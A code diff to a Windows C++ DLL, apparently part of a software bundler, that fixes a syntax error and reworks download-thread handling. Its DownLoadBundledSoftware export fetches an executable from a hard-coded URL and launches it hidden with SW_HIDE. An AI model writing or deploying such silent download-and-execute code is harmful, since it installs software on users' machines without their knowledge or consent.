@@ -345,7 +345,7 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 	{
 		return 0;
 	}
-	char *p = strrchr(szUrl, '/')
+	char *p = strrchr(szUrl, '/');
 	if(p != NULL && strlen(p+1) > 0) {
 		::PathCombineA(szBuffer,szBuffer,p+1);
 	} else {
@@ -363,11 +363,10 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
 	}
 	::CoUninitialize();
-	if (strstr(szBuffer, "exe") != NULL && SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
+	if (strstr(szBuffer, ".exe") != NULL && SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
 	{
 		::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
 	}
-	SetUserHandle();
 	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
 }
 
@@ -375,7 +374,6 @@ extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
 {
 	CHAR szUrl[] = "http://dl.360safe.com/p/Setup_oemqd50.exe";
 	DWORD dwThreadId = 0;
-	ResetUserHandle();
 	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
 	if (NULL != hThread)
 	{
@@ -388,14 +386,28 @@ extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
 	}
 	return;
 }
-
+static HANDLE hThreadINI;
 extern "C" __declspec(dllexport) void DownLoadIniConfig()
 {
 	CHAR szUrl[] = "http://192.168.101.254/test.ini";
 	DWORD dwThreadId = 0;
-	ResetUserHandle();
-	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
-	CloseHandle(hThread);
+	hThreadINI = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
+
+}
+
+extern "C" __declspec(dllexport) int WaitINI()
+{
+	int nRet = 0;
+	if (NULL != hThreadINI)
+	{
+		DWORD dwRet = WaitForSingleObject(hThreadINI, 0);
+		if (dwRet == WAIT_OBJECT_0)
+		{
+			nRet = 1;
+		}
+		CloseHandle(hThreadINI);
+	}
+	return nRet;
 }
 
 extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid)
